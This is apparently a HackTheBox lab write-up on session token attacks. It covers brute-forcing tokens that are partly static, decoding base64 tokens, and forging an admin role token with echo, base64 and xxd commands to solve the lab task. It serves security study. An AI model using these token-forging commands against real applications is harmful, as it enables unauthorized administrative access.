# 🕶️ Session Attacks

a common flaw in apps that use session token and the main danger is if a session token is too short or contains static data that does not provide randomness to the token

<figure><img src="../../../.gitbook/assets/image (12) (1) (1) (1) (2).png" alt=""><figcaption><p>easy bruteforce</p></figcaption></figure>

Now a bit more complex but as easy to break ->

<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (2) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

This seems complex but let's say we send plenty of requests:

```
2c0c58b27c71a2ec5bf2b4b6e892b9f9
2c0c58b27c71a2ec5bf2b4546092b9f9
2c0c58b27c71a2ec5bf2b497f592b9f9
2c0c58b27c71a2ec5bf2b48bcf92b9f9
2c0c58b27c71a2ec5bf2b4735e92b9f9
```

the static string `2c0c58b27c71a2ec5bf2b4` followed by four random characters and the static string `92b9f9`

So we can still bruteforce

Some more realistic stuff would consist of session tokens that contains encoded data

This seems very random:

<figure><img src="../../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (2) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

But in fact ->

```shell-session
ElFelixi0@htb[/htb]$ echo -n dXNlcj1odGItc3RkbnQ7cm9sZT11c2Vy | base64 -d

user=htb-stdnt;role=user
```

So we could create our session token with a simple command:

```shell-session
echo -n 'user=htb-stdnt;role=admin' | base64
```

<figure><img src="../../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (2) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

We should also keep an eye out for data in hex-encoding or URL-encoding.

<figure><img src="../../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (2) (1) (1) (1) (1).png" alt=""><figcaption><p>hex-encoded data</p></figcaption></figure>

And to craft a session token we could simply use the follwoing:

```shell-session
echo -n 'user=htb-stdnt;role=admin' | xxd -p
```

_**Obtain administrative access on the target to obtain the flag.**_

```
echo -n 'user=htb-stdnt;role=admin' | xxd -p
```

<figure><img src="../../../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (2) (1).png" alt=""><figcaption></figcaption></figure>
